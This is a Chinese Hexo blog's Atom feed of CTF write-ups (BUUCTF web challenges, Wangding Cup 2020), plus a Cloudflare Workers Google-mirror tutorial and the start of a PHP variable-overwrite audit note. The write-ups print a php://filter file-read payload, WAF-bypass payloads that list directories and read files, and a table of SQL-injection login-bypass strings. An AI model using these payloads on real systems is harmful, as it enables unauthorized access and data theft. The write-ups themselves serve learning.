<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>大周&#39;blog</title>
  
  <subtitle>ctf</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lingxin16.github.io/"/>
  <updated>2020-05-30T04:01:37.892Z</updated>
  <id>http://lingxin16.github.io/</id>
  
  <author>
    <name>奝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>极客大挑战2019-SecretFile</title>
    <link href="http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/"/>
    <id>http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/</id>
    <published>2020-05-30T03:41:37.000Z</published>
    <updated>2020-05-30T04:01:37.892Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/1.png" alt="1"></p><p>把一切都放在那里了 说明我们需要找到隐藏信息，查看源代码</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/2.png" alt="2"></p><p>发现./Archive_room.php</p><p>打开</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/3.png" alt="3"></p><p>点击secret</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/4.png" alt="4"></p><p>发现查阅结束，没看清么？回去再仔细看看吧。</p><p>多次尝试我们并没有发现有什么变化，那么使用burpsuit抓包</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/5.png" alt="5"></p><p>选择send to repeater</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/6.png" alt="6"></p><p>重放之后发现secr3t.php</p><p>访问</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/7.png" alt="7"></p><p>发现flag.php 访问</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/8.png" alt="8"></p><p>这次什么都没有，源代码中也没有任何发现，但是在secr3t.php中也有过滤，但是我们可以用filter协议，同样可以读取flag.php的内容</p><p>访问/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-SecretFile/9.png" alt="9"></p><p>下边的一串字符就是flag.php的内容的base64形式</p><p>然后base64解码得到</p><pre><code class="html">&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;FLAG&lt;/title&gt;&lt;/head&gt;&lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;    &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;    &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;        &lt;?php            echo &quot;我就在这里&quot;;            $flag = &#39;flag{99d1cd98-c137-49fd-b4fa-caa468d75d01}&#39;;            $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;        ?&gt;    &lt;/p&gt;&lt;/body&gt;</code></pre><p>提交flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-Havefun</title>
    <link href="http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/"/>
    <id>http://lingxin16.github.io/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/</id>
    <published>2020-05-30T03:28:49.000Z</published>
    <updated>2020-05-30T03:37:31.942Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/1.png" alt="1"></p><p>并没有发现什么有用的信息，查看源代码发现</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/2.png" alt="2"></p><p>当我们传入一个cat参数，就把这个参数的值打印出来，当传入cat=dog时我们发现返回的值是一串类似flag的字符串</p><p>那么我们尝试?cat=dog 得到flag</p><p><img src="/2020/05/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/3.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>roarctf2019-easy Calc</title>
    <link href="http://lingxin16.github.io/2020/05/29/roarctf2019-easy%20Calc/"/>
    <id>http://lingxin16.github.io/2020/05/29/roarctf2019-easy%20Calc/</id>
    <published>2020-05-29T04:57:33.000Z</published>
    <updated>2020-05-29T06:48:21.286Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目是这样子的</p><p><img src="https://i.loli.net/2020/05/29/aKvcues4E6b5A2X.jpg" alt="QQ截图20200529130023"></p><p>类似一个计算器</p><p>在源代码中我们看到他增加了一个waf 还发现了calc.php</p><p><img src="https://i.loli.net/2020/05/29/Dk9zKLiOSrx4gTG.jpg" alt="QQ截图20200529130218.jpg"></p><p>打开calc.php可以看到他设置了黑名单</p><p><img src="https://i.loli.net/2020/05/29/UlnXEjeLzJVf2Ax.jpg" alt="QQ截图20200529130500.jpg"></p><p>那么我们就是要想法绕过</p><p>这里我们是选择用PHP的字符串解析来bypass</p><p>构造payload:</p><p>查看目录:calc.php?%20num=var_dump(scandir(chr(47)))</p><p><img src="https://i.loli.net/2020/05/29/xJOg6MXqyvweoSi.png" alt="1.png"></p><p>这里我们发现一个文件f1agg</p><p>读取f1agg:calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><p>得到flag</p><p>这里我们用HTTP走私漏洞同样也可以解这道题</p><p>参考<a href="https://www.plasf.cn/2019/10/16/2019-10-16-HTTP%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-RoarCTF2019-easycalc/" target="_blank" rel="noopener">HTTP走私漏洞</a></p><p><img src="https://i.loli.net/2020/05/29/9LybDktjNHe6gJw.png" alt="2.png"></p><p><img src="https://i.loli.net/2020/05/29/xahgr3f9dWCqG4Z.png" alt="3.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战2019-EasySQL</title>
    <link href="http://lingxin16.github.io/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/"/>
    <id>http://lingxin16.github.io/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/</id>
    <published>2020-05-29T04:30:36.000Z</published>
    <updated>2020-05-29T04:41:02.697Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/QQ%E6%88%AA%E5%9B%BE20200529123305.jpg" alt="QQ截图20200529123305"></p><p>根据题目可以知道应该是个sql注入</p><p>先用万能密码尝试</p><p>用户名:admin’or 1=1#</p><p>密码:admin</p><p>登录成功，得到flag</p><p><img src="/2020/05/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/QQ%E6%88%AA%E5%9B%BE20200529123625.jpg" alt="QQ截图20200529123625"></p><p>这里给出一些不同语言类型的万能密码</p><table><thead><tr><th align="left">语言</th><th>万能密码</th></tr></thead><tbody><tr><td align="left">PHP</td><td>‘or 1=1/*<br>“or “a”=”a<br>“or 1=1–<br>“or”=”<br>“or”=”a’=’a<br>“or1=1–<br>“or=or”<br>‘’or’=’or’<br>‘) or (‘a’=’a<br>‘.).or.(‘.a.’=’.a<br>‘or 1=1<br>‘or 1=1–<br>‘or 1=1/*<br>‘or”=”a’=’a<br>‘or’ ‘1’=’1’<br>‘or’’=’<br>‘or’’=’’or’’=’<br>‘or’=’1’<br>‘or’=’or’<br>‘or.’a.’=’a<br>‘or1=1–<br>1’or’1’=’1<br>a’or’ 1=1–<br>a’or’1=1–<br>or ‘a’=’a’<br>or 1=1–<br>or1=1–</td></tr><tr><td align="left">asp aspx</td><td>“or “a”=”a<br>‘.).or.(‘.a.’=’.a<br>or 1=1–<br>‘or 1=1–<br>a’or’ 1=1–<br>“or 1=1–<br>‘or.’a.’=’a<br>“or”=”a’=’a<br>‘or’’=’<br>or’=’or’</td></tr><tr><td align="left">jsp</td><td>1’or’1’=’1<br>admin’ or 1=1/*</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>利用cloudflareWorkers制作Google镜像站</title>
    <link href="http://lingxin16.github.io/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/"/>
    <id>http://lingxin16.github.io/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/</id>
    <published>2020-05-11T01:43:04.000Z</published>
    <updated>2020-05-11T02:53:01.266Z</updated>
    
    <content type="html"><![CDATA[<p>今天在群里看到大佬弄的谷歌镜像站，于是也学着部署了一份</p><a id="more"></a><p>首先我们需要注册一个Cloudflare账号</p><p>cloudflare官网： <a href="https://www.cloudflare.com/" target="_blank" rel="noopener">https://www.cloudflare.com/</a></p><p>注册登录之后选择workers</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511094942.jpg" alt="QQ截图20200511094942"></p><p>点击创建worker</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095051.jpg" alt="QQ截图20200511095051"></p><p>将下边的代码粘贴到左边代码框</p><pre><code>// Website you intended to retrieve for users.const upstream = &#39;www.google.com&#39;// Custom pathname for the upstream website.const upstream_path = &#39;/&#39;// Website you intended to retrieve for users using mobile devices.const upstream_mobile = &#39;www.google.com&#39;// Countries and regions where you wish to suspend your service.const blocked_region = [&#39;KP&#39;, &#39;SY&#39;, &#39;PK&#39;, &#39;CU&#39;]// IP addresses which you wish to block from using your service.const blocked_ip_address = [&#39;0.0.0.0&#39;, &#39;127.0.0.1&#39;]// Whether to use HTTPS protocol for upstream address.const https = true// Whether to disable cache.const disable_cache = true// Replace texts.const replace_dict = {    &#39;$upstream&#39;: &#39;$custom_domain&#39;,    &#39;//google.com&#39;: &#39;&#39;}addEventListener(&#39;fetch&#39;, event =&gt; {    event.respondWith(fetchAndApply(event.request));})async function fetchAndApply(request) {​    const region = request.headers.get(&#39;cf-ipcountry&#39;).toUpperCase();​    const ip_address = request.headers.get(&#39;cf-connecting-ip&#39;);​    const user_agent = request.headers.get(&#39;user-agent&#39;);​    ​    let response = null;​    let url = new URL(request.url);​    let url_hostname = url.hostname;​    ​    if (https == true) {​        url.protocol = &#39;https:&#39;;​    } else {​        url.protocol = &#39;http:&#39;;​    }​    ​    if (await device_status(user_agent)) {​        var upstream_domain = upstream;​    } else {​        var upstream_domain = upstream_mobile;​    }​    ​    url.host = upstream_domain;​    if (url.pathname == &#39;/&#39;) {​        url.pathname = upstream_path;​    } else {​        url.pathname = upstream_path + url.pathname;​    }​    ​    if (blocked_region.includes(region)) {​        response = new Response(&#39;Access denied: WorkersProxy is not available in your region yet.&#39;, {​            status: 403​        });​    } else if (blocked_ip_address.includes(ip_address)) {​        response = new Response(&#39;Access denied: Your IP address is blocked by WorkersProxy.&#39;, {​            status: 403​        });​    } else {​        let method = request.method;​        let request_headers = request.headers;​        let new_request_headers = new Headers(request_headers);​    ​        new_request_headers.set(&#39;Host&#39;, url.hostname);​        new_request_headers.set(&#39;Referer&#39;, url.hostname);​    ​        let original_response = await fetch(url.href, {​            method: method,​            headers: new_request_headers​        })​    ​        let original_response_clone = original_response.clone();​        let original_text = null;​        let response_headers = original_response.headers;​        let new_response_headers = new Headers(response_headers);​        let status = original_response.status;​        ​        if (disable_cache) {​            new_response_headers.set(&#39;Cache-Control&#39;, &#39;no-store&#39;);​        }​    ​        new_response_headers.set(&#39;access-control-allow-origin&#39;, &#39;*&#39;);​        new_response_headers.set(&#39;access-control-allow-credentials&#39;, true);​        new_response_headers.delete(&#39;content-security-policy&#39;);​        new_response_headers.delete(&#39;content-security-policy-report-only&#39;);​        new_response_headers.delete(&#39;clear-site-data&#39;);​        ​        if(new_response_headers.get(&quot;x-pjax-url&quot;)) {​            new_response_headers.set(&quot;x-pjax-url&quot;, response_headers.get(&quot;x-pjax-url&quot;).replace(&quot;//&quot; + upstream_domain, &quot;//&quot; + url_hostname));​        }​        ​        const content_type = new_response_headers.get(&#39;content-type&#39;);​        if (content_type.includes(&#39;text/html&#39;) &amp;&amp; content_type.includes(&#39;UTF-8&#39;)) {​            original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname);​        } else {​            original_text = original_response_clone.body​        }​        ​        response = new Response(original_text, {​            status,​            headers: new_response_headers​        })​    }​    return response;}async function replace_response_text(response, upstream_domain, host_name) {    let text = await response.text()​    var i, j;​    for (i in replace_dict) {​        j = replace_dict[i]​        if (i == &#39;$upstream&#39;) {​            i = upstream_domain​        } else if (i == &#39;$custom_domain&#39;) {​            i = host_name​        }​    ​        if (j == &#39;$upstream&#39;) {​            j = upstream_domain​        } else if (j == &#39;$custom_domain&#39;) {​            j = host_name​        }​    ​        let re = new RegExp(i, &#39;g&#39;)​        text = text.replace(re, j);​    }​    return text;}async function device_status(user_agent_info) {    var agents = [&quot;Android&quot;, &quot;iPhone&quot;, &quot;SymbianOS&quot;, &quot;Windows Phone&quot;, &quot;iPad&quot;, &quot;iPod&quot;];    var flag = true;    for (var v = 0; v &lt; agents.length; v++) {        if (user_agent_info.indexOf(agents[v]) &gt; 0) {            flag = false;            break;        }    }    return flag;}</code></pre><p>左上角项目名可以修改</p><p>然后点击保存并部署就可以了 可以先点击右边的预览查看效果</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095402.jpg" alt="QQ截图20200511095402"></p><p>可以返回首页点击workers来管理</p><p><img src="/2020/05/11/%E5%88%A9%E7%94%A8cloudflareWorkers%E5%88%B6%E4%BD%9CGoogle%E9%95%9C%E5%83%8F%E7%AB%99/QQ%E6%88%AA%E5%9B%BE20200511095646.jpg" alt="QQ截图20200511095646"></p><p>下面是我创建的镜像</p><p><a href="http://gg.d1a0.workers.dev/" target="_blank" rel="noopener">http://gg.d1a0.workers.dev/</a></p><p>虽然Cloudflare Workers 每天只有10万次免费的请求 ,不过也够个人使用了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天在群里看到大佬弄的谷歌镜像站，于是也学着部署了一份&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>2020网鼎杯青龙组部分wp</title>
    <link href="http://lingxin16.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/"/>
    <id>http://lingxin16.github.io/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/</id>
    <published>2020-05-10T13:10:22.000Z</published>
    <updated>2020-05-11T01:00:06.850Z</updated>
    
    <content type="html"><![CDATA[<p>第一次参加网鼎杯，作为一个萌新，这次我们队只做出来了两道题，全程都在解哪个汉信码，最后也没解出来，我太菜了，555…</p><a id="more"></a><h2 id="misc签到"><a href="#misc签到" class="headerlink" title="misc签到"></a>misc签到</h2><p>misc签到题给的是个web容器，打开链接</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210516.jpg" alt="QQ截图20200510210516"></p><p>根据上方战队名选择战队图片，有三次错误机会，猜的时间是十秒</p><p>当连续猜对15次之后需要输入战队token</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210711.jpg" alt="QQ截图20200510210711"></p><p>输入token后在控制台找到flag</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510210731.jpg" alt="QQ截图20200510210731"></p><h2 id="crypto-boom"><a href="#crypto-boom" class="headerlink" title="crypto boom"></a>crypto boom</h2><p>下载后是个boom.exe 放在cmd中运行</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510211622.jpg" alt="QQ截图20200510211622"></p><p>根据提示，解一次md5，输入结果</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510211814.jpg" alt="QQ截图20200510211814"></p><p>然后解三元一次方程</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510212119.jpg" alt="QQ截图20200510212119"></p><p>再解出x后得到flag(由于不会解，可以直接爆破得到x)</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510212054.jpg" alt="QQ截图20200510212054"></p><h2 id="crypto-you-raise-me-up"><a href="#crypto-you-raise-me-up" class="headerlink" title="crypto you raise me up"></a>crypto you raise me up</h2><p>下载附件后解压是个py脚本</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomn = 2 ** 512m = random.randint(2, n-1) | 1c = pow(m, bytes_to_long(flag), n)print &#39;m = &#39; + str(m)print &#39;c = &#39; + str(c)# m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075# c = 66658513942032142458567894507236586325208167916217967759097668952330002340</code></pre><p>可以sage工具的discrete_log解</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510215003.jpg" alt="QQ截图20200510215003"></p><p>discrete_log(mod(c,n),mod(m,n))得56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E5%9B%BE%E7%89%8720200511085512.png" alt="QQ图片20200511085512"></p><p>然后用libnum模块解n2s</p><pre><code class="python">import libnumflag = 56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757print (libnum.n2s(flag))</code></pre><p>得到flag</p><h2 id="misc-虚幻二"><a href="#misc-虚幻二" class="headerlink" title="misc 虚幻二"></a>misc 虚幻二</h2><p>今天差不多全程都在解这个题，实在是不知道怎么拼出汉信码</p><p>下载完附件后用Stegsolve分析，保存green，red和blue三个图层</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/green.png" alt="green"></p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/red.png" alt="red"></p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/blue.png" alt="blue"></p><p>看不清可以放大处理一下</p><p>其中red和blue都是31 * 10的排列 green是31 * 11的排列方式，那么从green开始，按照green、blue、red循环的方式，每次用一行进行拼接，得到一个31  * 31的图像  然后需要将左上角7 * 7的方块旋转180°，再将整个图像逆时针旋转90° ，旋转之后图片上方有个7 * 10大小的空白区域，就是hint中所说的暴力恢复的地方</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510214431.jpg" alt="QQ截图20200510214431"></p><p>恢复之后如下图</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E6%88%AA%E5%9B%BE20200510214441.jpg" alt="QQ截图20200510214441"></p><p>在线扫码得到flag</p><p>扫码地址:<a href="http://www.efittech.com/hxdec.html" target="_blank" rel="noopener">http://www.efittech.com/hxdec.html</a></p><p>赛后还听说有的战队是直接爬了解码网站，把其他队伍上传的汉信码都爬了下来…emm</p><p>我研究了下确实是可行的，于是在<a href="https://www.cnblogs.com/anweilx/" target="_blank" rel="noopener">@anweilx</a>师傅的指导下也写了批量爬取的脚本在这里贴出来</p><pre><code class="Python">#coding:utf–8import requestsfor m in range (0,61):#取0分到60分    for s in range (0,61):    #取0秒到60秒        url=&quot;http://www.efittech.com/upload/pics/pic_2020051013&quot; + &quot;%02d%02d&quot;%(m ,s )+&quot;.jpg&quot;        #2020051013是时间格式13是13点        获取=requests.get(url)#获取网络请求信息        #获取网络图片二进制流        流=获取.content        #将二进制流保存到图片文件中        if b&quot;\xff\xd8&quot; in 流:        #判断该图片是否存在            file = open(&quot;./汉信码13/&quot; + &quot;%02d%02d&quot;%(m ,s ) +&quot;.jpg&quot;,&quot;wb&quot;)            #将图片命名为分钟+秒数.jpg            file.write(流)            file.close()</code></pre><p>第一次写，写的不好师傅们轻点打</p><p><img src="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E9%83%A8%E5%88%86wp/QQ%E5%9B%BE%E7%89%8720200511085611.jpg" alt="QQ图片20200511085611"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次参加网鼎杯，作为一个萌新，这次我们队只做出来了两道题，全程都在解哪个汉信码，最后也没解出来，我太菜了，555…&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客添加文章访问密码</title>
    <link href="http://lingxin16.github.io/2020/05/07/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E8%AE%BF%E9%97%AE%E5%AF%86%E7%A0%81/"/>
    <id>http://lingxin16.github.io/2020/05/07/hexo%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E8%AE%BF%E9%97%AE%E5%AF%86%E7%A0%81/</id>
    <published>2020-05-07T10:16:42.000Z</published>
    <updated>2020-05-07T11:53:43.117Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">密码123456</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c424235f0116965c045ec9272bd30cbaa99d71895d570e5710a3fa3a508a4b18">037923a29417dcb57ea278bc904620b7af2caafecbc18a8abcbcb385f4cdb2d9d3fe01425ed8362f1b3775e0f857e6058c4d5366f118747e1bfd1c8489f143eccd0c996f9a06c092b4508b2dc146418255243800bf0a1faded9760885d8a1568efbb32e59a42cf0ecb82c09a9e6f6866dc222a339ff7abdc9acbdc7082934e387c2304681a7210578c032eb4c7781fb4119094557060cb3de8230f6e96e96bd6551892c02329d3f90aa9d061ff25518d8be11dcc15deda07c0ad33a8e727962a339a56cddabb23472049594048036af94c3a75cfbb49b12a7567a2b752c90bd91a1628f4b635164b0b52366e47ac18441fb8bba5a9eaad776e7fae49f7d75b75ac85d84ab4a17edf97c146c862d329f17bfd6a22bbacecf0ee88964dd472bf0c55bd57e08919d719bfa4bac82a26fa056281b0fb429645b4f4f74a4ef9af2680</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码123456
    
    </summary>
    
    
    
      <category term="博客搭建" scheme="http://lingxin16.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day10</title>
    <link href="http://lingxin16.github.io/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day10/"/>
    <id>http://lingxin16.github.io/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day10/</id>
    <published>2020-03-26T13:36:59.000Z</published>
    <updated>2020-05-07T11:35:15.254Z</updated>
    
    <content type="html"><![CDATA[<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><a id="more"></a><p>变量覆盖是指变量未被初始化，我们可以自定义参数值替换程序原有的变量值</p><h2 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h2><pre><code>int extract ( $array , extract_rules,prefix )$array 关联的数组，受第二个和第三个参数的影响extract_rules 对待非法/ 数字和冲突的键名的方法将根据取出标记prefix 仅在第二个参数特殊时需要，添加前缀</code></pre><h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><pre><code>EXTR_OVERWRITE-默认。如果有冲突，则覆盖已有的变量。EXTR_SKIP- 如果有冲突，不覆盖已有的变量。( 忽略数组中同名的元素)EXTR_PREFIX_SAME .如果有冲突，在变量名前加上前缀prefix。自PHP4.0.5起，这也包括了对数字索引的处理EXTR_PREFIX_ALL- 给所有变量名加上前缀prefx (第三个参数)EXTR_PREFIX_INVALID -仅在非法或数字变量名前加上前缎prefix。本标记是PHP4.0.5新加的。EXTR_IF_EXISTS- 